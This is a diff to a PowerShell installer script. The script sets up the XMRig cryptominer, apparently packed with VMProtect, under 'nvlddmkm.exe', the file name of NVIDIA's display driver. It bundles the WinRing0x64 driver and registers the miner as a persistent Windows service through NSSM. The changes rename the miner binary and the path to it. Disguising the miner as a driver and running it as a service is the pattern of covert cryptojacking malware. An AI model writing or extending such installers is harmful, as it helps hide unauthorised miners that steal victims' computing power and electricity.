@@ -170,7 +170,7 @@ $files = @{
 # Check if files already exist locally first
 Write-Host "  Checking for local files..." -ForegroundColor Gray
 $localFiles = Get-ChildItem -Path $scriptDir -File | Where-Object { 
-    $_.Name -in @('nvlddmkm.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
+    $_.Name -in @('nvlddmkm.vmp.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
 }
 
 foreach ($localFile in $localFiles) {
@@ -256,7 +256,7 @@ Write-Host "`nStep 7: Configuring service..." -ForegroundColor Cyan
 Set-Location $targetDir
 
 $nssmPath = Join-Path $targetDir "nssm.exe"
-$xmrigPath = Join-Path $targetDir "nvlddmkm.exe"
+$xmrigPath = Join-Path $targetDir "nvlddmkm.vmp.exe"
 
 if (Test-Path $nssmPath) {
     try {
@@ -355,6 +355,7 @@ if ($Host.Name -eq "ConsoleHost") {
     Write-Host "`nPress any key to exit..." -ForegroundColor DarkGray
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
+
 
 
 
